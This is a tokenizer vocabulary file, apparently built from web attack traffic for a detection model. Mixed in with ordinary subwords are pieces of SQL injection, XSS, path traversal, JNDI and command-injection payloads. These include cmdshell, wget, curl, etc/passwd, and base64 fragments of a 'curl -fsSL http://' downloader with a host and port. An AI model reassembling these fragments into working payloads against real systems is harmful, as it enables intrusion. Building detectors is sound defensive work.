[PAD]
[UNK]
[CLS]
[SEP]
[MASK]
[UNK0]
[UNK1]
[UNK2]
[UNK3]
[UNK4]
[UNK5]
[UNK6]
[UNK7]
[UNK8]
[UNK9]
[unused0]
[unused1]
[unused2]
[unused3]
[unused4]
[unused5]
[unused6]
[unused7]
[unused8]
[unused9]
[unused10]
[unused11]
[unused12]
[unused13]
[unused14]
[unused15]
[unused16]
[unused17]
[unused18]
[unused19]
[unused20]
[unused21]
[unused22]
[unused23]
[unused24]
[unused25]
[unused26]
[unused27]
[unused28]
[unused29]
[unused30]
[unused31]
[unused32]
[unused33]
[unused34]
[unused35]
[unused36]
[unused37]
[unused38]
[unused39]
[unused40]
[unused41]
[unused42]
[unused43]
[unused44]
[unused45]
[unused46]
[unused47]
[unused48]
[unused49]
!
"
#
$
%
&
'
(
)
*
+
,
-
.
/
0
1
2
3
4
5
6
7
8
9
:
;
<
=
>
?
@
A
B
C
D
E
F
G
H
I
J
K
L
M
N
O
P
Q
R
S
T
U
V
W
X
Y
Z
[
\
]
^
_
`
a
b
c
d
e
f
g
h
i
j
k
l
m
n
o
p
q
r
s
t
u
v
w
x
y
z
{
|
}
~
¡
¢
£
¤
§
©
ª
¬
°
²
³
´
µ
¶
·
¸
¹
»
¼
¾
ê
ë
ì
í
ï
ž
ϱ
ݵ
‘
’
“
”
…
⋆
⌐
◕
当
간
건
검
결
고
공
과
국
그
근
기
년
녕
뉴
는
다
대
데
도
드
램
력
로
료
를
리
마
만
멘
문
미
민
본
색
서
선
성
세
술
스
신
쓰
아
안
양
어
얼
업
여
영
예
왜
요
울
원
의
이
입
있
잠
정
조
종
주
지
초
최
출
케
켓
큐
터
테
트
팸
페
프
하
한
항
해
홈
화
회
＇
##r
##t
##b
##a
##n
##k
##1
##6
##D
##u
##A
##Q
##P
##J
##2
##3
##9
##W
##o
##w
##e
##S
##h
##l
##f
##c
##s
##E
##C
##4
##N
##7
##q
##I
##y
##x
##V
##K
##8
##F
##L
##T
##0
##i
##B
##H
##j
##M
##d
##R
##m
##p
##v
##5
##Z
##G
##O
##g
##Y
##U
##z
##X
##종
##로
##그
##램
##ݵ
##드
##´
##입
##회
##원
##술
##건
##문
##ì
##ï
##¼
##이
##스
##국
##다
##큐
##멘
##터
##리
##영
##화
##테
##£
##색
##어
##를
##항
##기
##는
##료
##고
##있
##지
##력
##해
##주
##세
##요
##¾
##³
##µ
##¬
##ë
##¸
##°
##한
##민
##예
##정
##과
##울
##아
##트
##마
##켓
##²
##만
##양
##출
##녕
##하
##데
##ª
##©
##페
##ê
##최
##¢
##뉴
##얼
##초
##간
##년
##도
##ta
##ck
##tack
##ttack
Attack
CH
##ti
##on
##tion
CHR
##ction
##ab
##el
##pe
##ype
##yn
##tax
##yntax
##abel
Type
Label
Syntax
##ri
In
##je
##jection
Injection
##ND
##st
##QL
SQL
##rt
##rip
##crip
##hp
php
11
in
##wa
dv
dvwa
##LE
##ru
##ctions
inst
##ructions
instructions
SE
##CT
AND
##LECT
SELECT
##le
##te
##AR
##ss
CHAR
45
113
##ro
12
##SE
ht
##SS
##tp
po
http
##ng
port
##HE
10
##cript
##00
XSS
##er
do
##ite
##39
##33
##ting
##ross
Cross
Site
Scrip
Scripting
ip
##ar
##lert
doc
##HEN
alert
script
0x
120
OR
##71
##LL
##RO
80
##31
EL
##ON
##ROM
FROM
ch
##37
##34
##36
##35
CA
NU
##38
81
##nd
##ma
##30
##av
##ec
char
as
98
ELSE
END
NULL
THEN
CASE
WHEN
##2e
##in
AS
##al
##ers
##3135
##3433
0x39
##3738
##363135
##343330
0x39363135
##3738343330
0x393631353738343330
##2e39
##or
49
##62
##de
##sT
106
CO
cA
cAsT
##KE
##ION
##at
##AT
##us
122
##ER
on
sy
##ST
##ql
##mp
##map
sql
##AL
##ecu
sqlmap
##me
sys
##IKE
##ge
##0000
##NT
##76
UN
UNION
##ty
CON
pa
0x71
##6a
107
LIKE
or
40
##as
ALL
##UAL
DUAL
Tr
##avers
##aversal
Traversal
##RE
##ode
##ath
48
##ch
##mo
##99
##ble
##lo
Path
##es
##42
##32
##7a
##CAT
##YS
CONCAT
##EP
##78
##UNT
##95
te
jav
##11
se
##ad
ELT
de
##DE
##ssi
GE
##nt
##CE
##rc
WHE
WHERE
##li
##ascript
##an
PD
##44
secu
securi
imp
COUNT
security
impo
PDF
##RI
SLE
SLEEP
and
dev
javascript
GET
50
Re
##re
##ssible
##6b
impossible
##ame
Ex
src
##70
org
##65
con
##et
0x39363135373834333031
##72
118
##ou
CODE
##61
20
##tc
##64
##SER
##BM
##users
sysusers
USER
##arch
USERS
##OR
##for
##12
etc
52
##wd
##40
##ul
##ce
SYS
pass
Code
fi
##mote
Remote
##ID
112
##ect
IN
search
test
54
##ecution
51
##mg
##51
##90
##ew
##xt
Execution
##96
img
passwd
##IN
##gi
88
##28
##om
##HP
##68
##load
55
RCE
BY
##MA
77
PHP
id
##ner
##min
CAST
ad
50000
90
##di
##ap
HT
62
##IC
##ue
##ML
##14
##ow
75
NUM
##SESS
##TP
##ERIC
NUMERIC
##it
##abi
##92
65
72
vi
##6271
HTTP
##75
##ror
##ulner
IS
##74
60
15
re
##94
22
##ml
68
PHPSESS
PHPSESSID
RA
66
chr
##un
ap
##QU
##pt
##IT
##AB
##6f
##98
3E
83
##error
##KO
##id
admin
18
##ls
onerror
84
EX
##ot
78
24
to
70
vulner
89
##10
58
iKO
85
0x716a
nan
##eb
##ra
##18
##LO
##abili
56
##ndi
67
##67
##able
99
RE
page
##7a71
conte
##54
pro
##IBM
97
##60
SYSIBM
87
##dap
##pl
jndi
vulnerabili
li
ldap
sel
UP
RAND
14
bo
sh
##ties
##ut
vulnerabilities
SC
##LES
Tab
##ser
##ost
##EX
##ver
SET
##Op
##ABLES
82
SY
##og
SYST
##ter
wp
##zp
69
##ars
##6a71
nv
##Opzp
nvOpzp
tmp
##la
##zi
ma
##79
##FOR
##use
##PE
##ind
111
##ard
sty
style
file
##AG
29
select
##ct
di
##que
ar
##3s
102
74
##st4
spl
##1ls
##u39
##ufor
##4295
##ou1ls
##gi4295
##3sgi4295
##st4ou1ls
spl3sgi4295
##u39ufor
##st4ou1lsu39ufor
spl3sgi4295st4ou1lsu39ufor
##rom
SYSTABLES
19
42
##OST
T1
T2
T3
##TX
##50
##cce
##rs
onmo
##TH
from
asp
86
##DER
##indow
##SX
##script
##ic
114
ORDER
CTX
SN
##SYS
##52
DRI
XML
##THSX
DRITHSX
CTXSYS
108
110
co
me
onmouse
##se
##BMS
28
53
DBMS
##quest
be
th
##age
64
0x717a
##ion
##get
##58
57
##DD
##am
##ate
##66
##pp
##6c
38
71
##PER
##dex
UPPER
32
get
##ory
##776
2F
200
5000000
##omma
79
##IV
MA
104
##ommand
Mo
MAKE
Th
x71
##d5
##UP
##6b7a71
0x716a62
##On
0x716a626271
##EF
##io
##6b71
an
view
board
##59
103
109
GRO
ME
GROUP
0x7162
##77
##ir
text
44
##md
##ACT
ini
##322e39
##indows
log
##69
##55
index
code
FLO
FLOOR
##PT
##TR
js
##od
##53
ex
nd
##ious
Command
##ke
##6f6
##over
##ment
76
PG
Mozi
##93
101
##96e
xml
##yload
##ing
##ATION
IF
##ang
##up
##OT
##DB
##El
name
##cl
##73
119
##AGE
PI
en
##is
##5c
payload
##Ni
##332e39
21
##UE
100
##63
##cT
##CH
fun
table
win
##lL
##NG
##SSAGE
##000
##CEIV
RECEIV
MESSAGE
PIPE
RECEIVE
##ast
RDB
##table
121
##ALUE
500000000
uNi
##ccept
##icious
##776e
uNiOn
sEl
##EcT
0x6c
sElEcT
3C
wget
##VALUE
##ACTVALUE
##TRACTVALUE
95
##oc
##cR
##7696e
##70776e
EXTRACTVALUE
##6f67696e
0x6c6f67696e
##70776e7a
0x6c6f67696e70776e7a
BIT
##LIKE
##07
116
main
##nte
AlL
RLIKE
##rl
##342e39
searchC
##ditable
contente
onmouseover
contenteditable
##Name
##ile
91
##RING
115
##cRi
46
new
##STRING
cat
73
DE
Dir
##mation
##NDI
117
##ectory
##ation
SCHE
host
##fr
##370
0x393631353738343330312e39
Directory
appe
2e
92
JNDI
user
web
##VER
par
u00
POST
no
##08
##999
##TE
##FORM
UT
cmd
##pon
##gg
##6a6a71
INFORM
SCHEMA
INFORMATION
Accept
##05
##ff
105
##RIPT
BE
DO
##FB
##ell
login
94
##che
windows
##ex
CONTE
##ase
##786271
CONTENT
##LA
0x716b
lang
ST
##362e39
##6a6b7a71
x716a6b7a71
searchCnd
appears
0x716b786271
30
rm
##ve
16
27
36
##LU
##16
##17
##ument
##97
##INS
T4
##be
x5c
NOT
rf
##20
##val
##13
##AP
##56
##frame
tru
##ata
arrs
document
0x393631353738343330322e39
st
##mage
vars
##Type
##372e39
##D5
##ps
true
CONVER
CONVERT
##alert
##co
##CO
##NCH
##BR
##MAR
##610
BENCH
##MARK
BENCHMARK
TO
mal
##88
DOMA
action
##911
61
##80
0x393631353738343330332e39
13
MD5
##ep
##MB
malicious
WA
800
##DU
SCRIPT
XMLType
##9551
##4407
##3709551
##44073709551
oast
##vg
##ring
##all
div
SU
not
##382e39
##DDR
0x716276
##44073709551610
17
image
##91
##cat
app
le
res
##ur
##pc
0x393631353738343330342e39
via
##ITFOR
WAITFOR
for
##25
##ok
##sh
##du
0x78
DELA
DELAY
is
##YLE
##ere
col
STYLE
##29
##ig
##ger
34
##il
request
SUB
net
##23
##formation
App
data
##352e39
onload
200911
##en
##lp
##FG
##OW
##ink
31
##6744073709551610
cid
iframe
##No
##HT
##gq
0x393631353738343330352e39
AB
##St
##pa
##392e39
un
##RC
##put
param
0x7162766a71
svg
##plo
126
Request
##ponse
INT
com
##Pt
##em
##47
##tain
##ATE
PLU
md5
##ead
##83
##GINS
0x717a6a6a71
hostName
PLUGINS
832
sc
xss
47
T5
cd
0x393631353738343330362e39
onbe
##gent
##cRiPt
arrs2
File
##EC
##ie
##766b71
contain
produ
product
bin
##wor
##lla
##can
0x717a766b71
onbefor
val
##ADDR
##cli
##cation
INADDR
UTL
ABC
ScRiPt
##LOB
96
Con
html
25
999
ADD
Agent
xp
##OMB
##RESS
java
##DEFG
RANDOMB
ABCDEFG
ADDRESS
RANDOMBLOB
En
HOST
REP
eval
##nj
##op
##NEF
##82
Mozilla
##ploit
HEX
##19
##ude
##85
##dl
0x393631353738343330372e39
SRC
##302e39
##ref
##ourc
of
##ub
##tima
EXEC
This
##clude
DOMAIN
For
ja
##3a
##46
##UU
set
##ress
##q8
##vi
##eth
##289
672
ond
##DAT
##4e
Exploit
##gitima
legitima
##ethod
legitimate
No
User
information
include
St
ke
##NER
0x28
##ding
41
Web
dra
jlp
##2f
##3q8
##cgq
##ES
##41
does
##medl
seq
content
##rscgq
##ppf
##d56f
##coding
##njmedl
jlpd56f
##3q8njmedl
##3q8njmedlrscgq
35
844
sche
##ndex
0x393631353738343330382e39
##es3q8njmedlrscgq
##COUNT
##ppfes3q8njmedlrscgq
jlpd56fppfes3q8njmedlrscgq
schema
BIN
al
url
##bb
##rite
SERI
##ARY
GENER
The
IFS
##ource
BINARY
SERIES
GENERATE
Host
##nu
##0F
BITSTRING
BITCOUNT
##BS
##mb
##gs
any
tables
##shell
qu
##ws
##86
##RF
##312e39
3Ealert
list
3Cscript
cmdshell
8446744073709551610
##ac
##gear
##lication
netgear
39
kr
##wn
##ww
##si
##NCT
##ject
0x393631353738343330392e39
the
2Fscript
##EAT
777
REG
ope
qj
##22
##YPE
##334
##EXP
SUBSTRING
REPEAT
REGEXP
ROW
attack
##ne
##81
##84
537
uff
write
##usion
##mod
value
##fa
##ING
UPDAT
##EXML
UPDATEXML
BO
lt
type
##DR
##89
##mpt
sys1
sys6
sys2
sys3
sys4
sys7
sys5
##7862
##ssion
##out
read
##okie
call
gt
tr
##24
##ho
0x716262
##click
href
##MG
##ase64
59
hav
source
##PC
chmod
##STER
SYSMA
Note
having
SYSMASTER
KE
LD
##bo
##na
##Ch
0x39363135373834333031302e39
jsp
##clusion
##ocus
##78626b71
0x7162627a71
FU
##focus
##NS
##57
Inclusion
##main
function
AN
ut
##th
##PAG
##21
##HDR
##pg
##rute
func
response
union
LDAP
##PAGHDR
135
brute
sta
SYSPAGHDR
0x716a6b7a71
##pass
String
##NCTION
FUNCTION
Ge
cate
##leep
##ine
##omcat
prompt
color
##15
##AN
##Code
##45
##386
exec
sleep
www
##ypass
##006
domain
memb
IMG
method
##bject
##ns
##os
int
##657
conf
##ray
##Ad
##26
##Id
0x39363135373834333031312e39
jaws
312
314
790
TYPE
##MMA
##der
##cko
##397
##ersion
COMMA
##zip
##ggable
draggable
cgi
gzip
it
up
wh
##kF
##09
##gin
onclick
Gecko
AD
xs
##oo
##zq
##112
array
##ccess
##sition
218
FI
MO
##BQ
Tomcat
scRi
tabi
##At
##EB
##48
##IG
##OLE
down
##eader
setup
MODE
scRipt
tabindex
144
299
mi
tit
##Bypass
##HR
##mu
##389
Encoding
BOOLE
TomcatBypass
BOOLEAN
26
5334
PRO
aut
##ist
##jc
##gr
##YSE
##ALYSE
##CEDU
0x39363135373834333031322e39
add
##own
7540
##gery
Forgery
download
PROCEDU
PROCEDURE
It
mps
##6e
##HA
##ja
input
INF
EXP
ANALYSE
mpsl
##rpc
##uc
##set
##ded
##1111
##ull
cookie
xmlrpc
ondra
member
242
WEB
##SRF
##sers
##stem
123
##40e
6205
80040e
Ch
cur
##ll
##sta
##01
##MY
##gro
##let
##ssage
##ator
999999
quot
5657
834
syntax
txt
##uage
##hu
##003
##ream
##402
ER
JS
jpg
##ol
##EM
##tice
##ore
like
80040e14
142
vti
##tle
##QV
##43
##text
##ROR
##302
##ansition
0x39363135373834333031332e39
##149
##FBY
##word
##Char
vtitle
662
Windows
hel
pri
rec
##bC
##aUU
##name
##AA
##ISE
##po
##gory
##421
##ression
7262
ERROR
611
RPC
version
x2e
##nQ
##ure
##ime
##BT
##jQ
##erver
RAISE
notice
uff1
JSON
190
##ack
##fo
##03
##756
1965
##Stream
260
DAT
cs
loc
##MMY
##362
##624
system
##ound
2010
##120
SYSDU
lib
menu
##key
##MMY1
SYSDUMMY1
amp
sus
##rf
##end
##My
##picious
##vo
##UF
0x39363135373834333032
##708
0x39363135373834333031342e39
##646
##405
fromChar
800a
mips
help
suspicious
fromCharCode
4386
737
US
cf
null
##ASE
##wO
##87
##imation
##ava
6268
9159
332
634
Base64
Java
by
du
##ht
##CB
##ME
##XJ
##ont
0x4
##613
##617
##101
context
##000d
print
800a000d
NT
Scan
ac
##ache
phpun
##erv
##111
##rea
5544
##ITY
form
##opy
##nection
##Admin
address
phpunit
RIG
##ster
##409
##ABASE
4635
category
##AtZ
RIGHT
131
272
2999
37
4112
678
##rator
##ext
##CL
##In
##jav
##MT
##384
onkey
##lose
##ith
##work
2995
auto
DATABASE
##javascript
251
css
##bl
##AV
##jq
##gn
##tent
##ecopy
##int
##943
8558
##183
##late
onbeforecopy
utf
3145
##bCAtZ
134
210
2289
XX
but
foo
x3
##nal
##Web
##ent
##fun
##Vy
##do
##dC
##RQ
##ele
##pear
invo
##rome
##archar
##QUJ
6779
exp
##HTML
scr
xspear
title
##function
invoke
4402
700
pl
varchar
x61
##dy
##RY
##vb
0x5c
##34f
201
##ptSt
that
application
##putStream
8329
1354
recptSt
##MyAdmin
invokefunction
359
Vulner
go
hu
pre
##rst
##27
##Wri
##RL
12ho
##31352e39
0x39363135373834333031352e39
master
getWri
4472
env
##grab
12home
getWriter
3362
5397
io
zgrab
##02
##iz
##ZG
##¬¸
##ARE
##ARCH
404
##684
7297
1024
3880
DECL
6721
open
##jax
DECLARE
196
2f
cu
close
mode
oN
sn
xm
##bs
##3Q
##xb
##LD
##544
4552
##374
CALL
##ount
##126
5695
dis
##APB
scode
key
##bbq
175
23
935
ajax
if
var
##ay
##uz
##Access
##IL
##Res
##til
order
4017
##ling
##rent
##QUM
1850
6114
6347
CSRF
C120
Sa
base
ro
##49
##jB
##Mo
##dF
##date
##mm
##365
##303a
##403
first
red
apos
5883
##54e
3234
##rlpc
##3020000
dual
##ervlet
xmrlpc
C1203020000
765
HAV
aND
cla
sub
##ui
##cc
##Con
##ip
##tity
phpMyAdmin
##atch
0x7178626b71
##logs
9082
config
upload
autofocus
huhu
HAVING
1943
33
4646
532
6613
Ht
URL
back
ct
ech
site
window
with
##kzq
##Kit
##df
##rop
##arget
##9999
##QUh
body
2937
think
##odHR
news
Application
KEYS
Chrome
USING
##wOi
utf8
3597
echo
##odHRwOi
168
252
742
KHTML
target
##und
##Scan
##cu
##CK
##FFBY
##F403
##BY
##Md
##down
##vate
##Users
##tic
##leWeb
##SET
pop
1012
118F403
password
boot
AppScan
AppleWeb
Connection
##BSFFBY
118F403006
AppleWebKit
00
212
350
860
9421
at
##and
##FNEF
##HNEF
##Reader
scripts
##766
##7a6a6a71
0x39363135373834333031362e39
8847
8792
x717a6a6a71
qjbbq
qjkzq
##aUUI
2720
expression
##FNEFaUUI
8405
Object
use
##WN
##lj
##ld
##04
##za
##tivate
4571
##368
ont
onc
4095
1585
##983
provi
8771
##ternal
x7178626b71
9551
params
##activate
methodName
##ground
background
211
4003
Smu
gpon
so
##ku
##Page
##cn
##s2
##Ipt
https
##LLATION
COLLATION
##ash
tex
import
##705
concat
##282
administ
self
##ggling
##fari
KEY
##board
##HAS
scrIpt
Safari
provided
Smuggling
gpon80
COLLATIONS
administrator
0000
798
CRY
LEF
cast
fr
op
pwd
qk
sk
##fer
##if
##Blogs
##RQU
##ZBR
##rigin
SQLID
SQLHAS
8066
8136
4077
##ameter
External
8873
8965
4208
getUsers
##08p
UTIL
Entity
AD7
1446
##ssages
7377
XXE
##Response
CRYPT
LEFT
SQLHASH
getUsersBlogs
UTILITY
192
GT
TABLES
cG
¼ì
##ELD
##ys
##Vi
##Time
##Be
##UR
##one
##337
onfocus
##ult
9974
1912
##4e544
FUNCTIONS
TYPES
FIELD
0x434f
firstTime
texta
¼ì²
FIELDS
295
63
637
AC
Found
New
Not
Sh
per
su
xx
##ag
##eri
##fH
##EQU
##Ny
##Vg
##8v
##Lj
##BW
##MNS
##dr
##Rl
##path
injection
492
COLU
##IONID
5414
2451
1022
6413
parameter
string
DOMAINS
SUBSET
##start
##54e54
##4e54454e54
0x434f4e54454e54
COLUMNS
399
3183
POR
head
rv
##tu
##bi
##ux
##Nz
##Iuc
##Le
##dG
##ms
##vc
##zO
##low
##list
##656
0x39363135373834333031372e39
5495
##dir
##927
8934
ondrag
current
8348
2606
##odHRwOi8v
GTID
textarea
492126
PORT
00000
3101
8999
aa
em
mt
object
server
vend
xwork
##udi
##eR
##IE
##Line
##mit
0x7
##mal
##ave
onMo
##messages
sysmessages
def
8836
##673
9912
6913
##OTE
language
Content
3124
where
##dCc
NewLine
vendor
##udio
onMouse
231
244
3c
965
9389
9111
bl
man
qna
##ry
##rror
##aW
##kel
##AD
##Ck
##qu
##Ro
##patch
##ony
##ript
8053
##NTT
##763
##648
fil
9099
SYSTEM
##value
arrs1
6722
contents
7902
6789
dispatch
popup
##kely
633
6149
8368
Cint
LO
lid
êµ
##nce
##nNTT
##3Vy
##EST
##CM
##Cd
##xnQ
##zj
##XV
##¬ë
##time
CHARACT
##mana
9835
##7878
0x39363135373834333031382e39
5230
##cess
884
7734
7533
##SESSIONID
1512
##QUxnQ
likely
SETS
meta
6166
confir
##bCAtZnNTT
option
dispatcher
êµ¬ë
CHARACTER
##manager
##bCAtZnNTTCB
êµ¬ë¬¸
161
3e
375
4000
635
Bu
KC
NV
eng
font
next
##rr
##ransition
##kq
##AME
##Call
##IF
##FC
##Gd
htm
##are
##35a
##383
##rep
const
##746
##984
243
5000000000
u003
9488
onbefore
##UUF
transition
methodCall
7909
6626
csrf
ontransition
confirm
Lang
base64
x86
##ugin
##Av
##cs
##Vs
##ide
##din
##pBQ
##5a
##ZXJ
##YX
##Xv
4963
##7671
##727
6271
6638
vulnerable
live
this
stdin
4790
includes
alter
##kFD
2427
uff1e
uff1c
1903
Vulnerable
curl
Language
171
233
354
990
Co
fuz
hm
kboard
mb
ob
ph
uri
##ton
##DA
##ed
##so
##CRIPT
##4b
##ylj
##06
##im
##mx
##OU
##UFB
##zele
##ery
8167
onan
##live
2062
##form
6577
6090
6025
##terfa
6453
There
##ment1
##vent
start
plugin
##ARCHAR
8608
selfrep
8846744073709551610
fuzzele
##yljne
onanimation
##terface
fuzzelement1
169
1389
412
MS
Nam
Y3Vy
blo
ca
mod
pla
##tro
##ba
##ager
##Wx
##c2
##cmd
##Cript
##Index
##y9
Interface
##ary
##626
##769
4053
##asCript
##787
##658
##721
fig
9016
##untime
##QUR
8932
pageIndex
##663
getIn
##COM
1300
8320
kef
##2f31
AD4
##port
Scanner
2516
1758
skyljne
deflate
NVARCHAR
Naming
getInputStream
250
3289
674
7149
Util
audio
drop
qb
##ari
##um
##2gg
##W5
##ox
##ly
##cate
##qq
##File
##Tp
##db
##ZD
##Over
##g08p
##ells
intc
1241
##395
##arc
##364
##mail
##ans
2092
##SERVER
##9090
redir
2298
##oto
8742
2942
animation
username
3034
##bed
##frames
images
##cliCk
all
opens
cfg
categoryCOM
oNcliCk
##ferer
##View
##Iuc2gg
9654
KCSESSIONID
plugins
intcNo
##Iuc2ggfH
3927
651
918
Acc
LR
QU
br
cOn
fRo
put
xo
##644
##uy
##A0
##ear
##hony
##fe
##ymp
##Fi
##Mj
##OX
##Y2
indi
##row
8161
syscmd
0x39363135373834333031392e39
9092
##75a
6670
##uns2
todo
5611
filename
encoding
5972
##setting
curpath
root
class
5323
cG93
Shell
currentsetting
onMouseOver
##zjjq
redirect
opensymp
fRoM
opensymphony
01
2A
262
328
562
5409
692
795
712
9708
Dis
label
mo
mar
qzjjq
ret
wor
x28
##rQ
##rE
##br
##kn
##ki
##Pro
##oad
##wNz
##Se
##ln
##fig
##cd
##LT
##MjQ
##pd
##GB
Information
inad
##333
##311
##379
##NTku
4090
seem
2025
6093
##ogin
4252
message
2006
9695
jaV
utl
3129
##jcwNz
memberAccess
location
1313
##MTcu
1349
button
##xbq
##ticle
parameters
##zOjcwNz
LOCK
##AvZG
##MjQzOjcwNz
inaddr
##NTkuNy
##MTcuMjQzOjcwNz
##MTcuMjQzOjcwNzAvZG
02
236
261
636
751
DRO
TEX
Up
fl
here
mnt
pn
sp
uid
users
ver
wel
x51
x29
##ud
##QQ
##PS
##lR
##file
##4c
##Ii
##VeR
##KT
##MZ
##pb
##py
##vas
127
##388
##los
##655
5439
7793
##948
6605
8508
shell
article
4498
##aste
FILE
##group
##gnl
1966
##Context
qkxbq
6376
ACJ
xwork2
##bCAtZnNTTCBodHRwOi8v
AD4APB
Account
cOnVeR
cG93ZXJ
Disc
DROP
TEXT
welf
cOnVeRt
0a
172
151
5c
8397
DEF
JO
VBS
cg
cache
ha
nor
pi
rp
tra
time
wid
xE
x72
x74
##nD
##2d
##hc
##fn
##sg
##IH
##Bu
##Ha
##d6a
##Xh
##hpage
##lection
0x23
##move
searc
##123
5255
5130
HTML
7589
##945
shells
die
##ffere
Config
##view
drag
##ored
3321
onkeydown
7425
3506
##EQUF
mtd
6335
MSGB
##trol
LRXv
jaVasCript
JOIN
normal
searchpage
MSGBOX
2384
3006
500
575
598
630
896
ACT
AA0
ID
WOW
command
dl
del
gen
hid
lM
mat
oc
rk
x76
xls
x69
x73
x63
##rh
##rded
##by
##Dx
##SB
##Servlet
##lf
##cy
##ESERVER
##Ce
##4d
##NjQ
##vv
##vious
##GN
##gd
##XB
##Xta
##eld
##rig
Index
1164
##warded
##tpServlet
0x2e
0x303a
##381
##inux
##mplate
##ould
##643
5437
##xtra
7756
6853
9236
##BRV
ondrage
2428
local
0x39363135373834333032302e39
println
7659
HttpServlet
ctl
##zaG
headers
photo
Y3VybCAtZnNTTCBodHRwOi8v
##g08p0
##losure
Disclosure
VBSCRIPT
AA0APB
WOW64
0x303a303a
##xtract
HttpServletResponse
0D
130
160
234
390
431
671
614
6763
842
868
978
968
SSRF
Server
Side
Win
ab
alive
bbs
extract
h1
pdf
x70
##kk
##QjB
##272
##WFB
##hx
##lJ
##cel
##Error
##NkFD
##GL
##OEF
##Yle
InputStream
1234
8147
##info
##ush
##EREM
##ecut
##426
##7871
5094
##96f
##741
7094
limit
dir
diag
1910
8678
7193
winnt
9568
stYle
onbeforecut
update
##olu
1425
##75644
keyframes
frame
3998
##tuf
aaa
manager
##IFN
obvious
seems
Upload
flush
##NjQWFB
ctl05
0x303a303a35
extractvalue
##QjBBSFFBY
##NkFDOEF
##EREMOTE
##NjQWFBQjBBSFFBY
##NkFDOEFMd
178
140
278
337
4766
4673
7708
831
928
960
9383
ADDR
Pro
Xo
act
ck
ci
event
email
fw
gop
ta
x6a
x64
##type
##tRQ
##akF
##kZBR
##uY
##ule
##AS
##JQUJ
##3b
##wQV
##wQUM
##Script
##lFB
##line
##lFC
##ft
##sy
##Ex
##4y
##435
##NV
##IUUF
##yx
##yd
##Vl
##FI
##TUR
##iQUJ
##jg
##dUF
##dReader
##mf
##mc
##vV
##vQU
##GIN
##go
##UQUh
##zQUM
##XdCc
##342
##36f
##3676
##385
8120
##ndCM
##ecute
##menu
##760
##954
teXta
template
##641
5233
5228
5417
5497
##aption
##747
##mlBR
apache
245
0x716a71
##ration
RETUR
2918
##EFHNEF
4466
4419
##mdBS
4600
appear
u0061
BEGIN
keep
##QVpBQ
##FBYndCM
##aUUJ
3327
##RQkZBR
##jBBR
##dFQVpBQ
##HNEFiQUJ
##FNEFaUUIwQUM
##FNEFaUUIzQUM
##RQUtRQ
##BWXdCc
##XVBRV
Buffere
##mxBR
##UFBb
##Iuc2ggfHNo
##rQWN
##rEa
##lRBSFFBY
welfare
lMxt
Win64
InputStreamReader
##akFIUUF
##JQUJUQUh
##wQVR
##lFBdUF
##lFCakFIUUF
##vQUNjQWFBQjBBSFFBY
teXtarEa
##EFHNEFad
##mdBSUFBb
##RQkZBRmdBSUFBb
##dFQVpBQlRBSFFBY
##FNEFaUUIzQUMwQVR
##RQUtRQXVBRV
BufferedReader
##JQUJUQUhrQWN
##lFBdUFFNEFaUUIwQUM
##lFCakFIUUFJQUJUQUhrQWN
##RQUtRQXVBRVFBYndCM
132
235
43
432
460
7663
930
And
CRE
Linux
NDx
Se
Un
XOR
brow
ko
##tus
##bile
##aw
##9jc
##hr
##hs
##lite
##sM
##scn
##xor
##TA
##HH
##MD
##da
##d64
##Re
##Rf
##press
##Zy
##ons
##ontext
1152
##396
##deo
##deactivate
##esh
##admin
##RICT
Referer
##dit
##94c
1877
##ability
##5459
proc
show
files
##quee
4294
aspx
onmouseout
STRICT
##ilder
4772
allow
query
try
colors
titLe
8341
libc
menuNo
##BYlFBdUFFNEFaUUIwQUM
embed
##cessBu
onbeforedeactivate
##VsbCAtZ
3545
Cookie
block
plain
6518
marquee
##NTkuNy4y
##MTcuMjQzOjcwNzAvZG9jc
track
genxor
##zaGVsbCAtZ
##IFNRQkZBRmdBSUFBb
ProcessBu
ckers
RETURNS
CREATE
browser
##NTkuNy4yMTcuMjQzOjcwNzAvZG9jc
ProcessBuilder
198
290
255
531
668
7289
AnD
Loc
Ma
area
bgs
bash
cj
count
link
none
rand
x0
xmp
##bu
##bh
##ks
##1q
##DY
##Path
##3J
##ort
##f6
##code
##VS
##List
##Load
##0E
##ich
##Bg
##dg
##my
##px
##ZW
##Gy
##GU
##zh
##zrs
##pet
##pec
phpinfo
SEARCH
1290
##3746
##355
##3536
##620
##625
##424
impolite
##659
##4092
##4091
##969
7537
video
2290
##QUEST
2493
arm
281
3211
catch
##LACE
REPLACE
status
which
x3cs
7009
2014092
Vulnerability
snip
URLs
oncut
oncontext
2316
##y9scn
##ansform
xorigin
##96f6e
gopage
##NTkuNy4yMTcuMjQzOjcwNzAvZG9jcy9scn
bgsound
##374696f6e
##409192
2014092409192
snippet
oncontextmenu
0A
0d
199
254
728
914
992
952
9624
Des
Fi
Te
bus
cmm
iR
path
sVg
util
x5
x80
##rD
##res
##tM
##nter
##JP
##3c
##wL
##fi
##cp
##7C
##Ij
##Th
##TZBR
##0c
##ib
##HJ
##jx
##Method
##mF
##vf
##5s
##zR
##per
##rty
##332
##360
##387
9829
##aliz
onbl
##765
##7662
0x7176
0x7170
##6a644
##706
202
##649
7775
6044
6088
repl
refr
185
8600
##EFE
META
logout
##ange
collection
##enu
##pace
##cancel
9999999
##HAccept
##11111111
1422
csp
x3e
7008
20100
##374948
9350
classi
##BeEFE
##erializ
filter
##QUxnQT
##OUEP
module
6748
categoryCOM0
6921
6367
7519
##EQUFMd
##GNBT
NDxo
##zrsOUEP
Deserializ
onblur
refresh
Deserialization
177
232
258
371
372
6648
711
7721
8000
995
Base
ENT
EQU
Tri
dfn
fre
header
map
now
pt
ping
pub
sa
would
##bd
##uo
##AU
##ee
##SzrsOUEP
##ci
##site
##sting
##sit
##7SzrsOUEP
##Vu
##Vq
##KP
##FF
##MC
##RPC
##RAME
##gy
##User
##rid
inc
insta
10s
0x68
9855
4854
##955
##6476
5469
##6870
5579
##dia
##ids
180
7894
7818
2456
7051
REQUEST
listing
4254
XMLRPC
bean
getR
443
xmlns
1002
9162
website
UTF
##enter
##refox
Stored
xsl
6620
0x39363135373834333032312e39
JavaScript
6781
onkeyup
2125
used
6371
xE2
XoR
##pecif
iR7SzrsOUEP
ENTITY
EQUIV
165
1766
237
228
268
214
344
3983
477
572
568
618
6984
731
732
871
830
93
971
931
9282
SM
gif
lu
mul
pe
pid
qty
rt
specif
year
ysy
ë¬¸
##b3
##aM
##ko
##1V
##Jz
##2a
##WJ
##fy
##font
##CD
##7374
##Vm
##KD
##Lm
##Lv
##Login
##TQ
##0n
##Hj
##HY
##m8
##pO
##Zn
##GQ
##zd
##zZ
##zG
##tal
